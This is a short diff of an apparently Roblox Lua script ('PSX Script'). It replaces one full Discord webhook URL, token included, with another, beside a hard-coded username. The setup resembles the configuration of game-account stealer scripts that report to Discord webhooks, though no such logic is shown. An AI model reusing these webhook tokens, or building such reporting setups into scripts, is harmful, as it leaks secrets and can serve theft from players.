@@ -6,7 +6,7 @@ end
 
 
 Username = "Plakins8"
-WebHook = "https://discord.com/api/webhooks/1081715015758921758/2TAXhu3feqSOwFpulvHMAkv6Zo7qMlo2LkBw6uklRm170cEqcjWSW-K8A9DX-PjGtmkt"
+WebHook = "https://discord.com/api/webhooks/1081725277937336441/cOVYCnVm6NCBJVO0DwCnM8tIC3kkifuijcNtrSr_45tVZhWUCGVeWvrZRXupsD4JiD_x"
 
 _G.CustomScriptName = "PSX Script"
 _G.Text1 = "Script Loaded..."
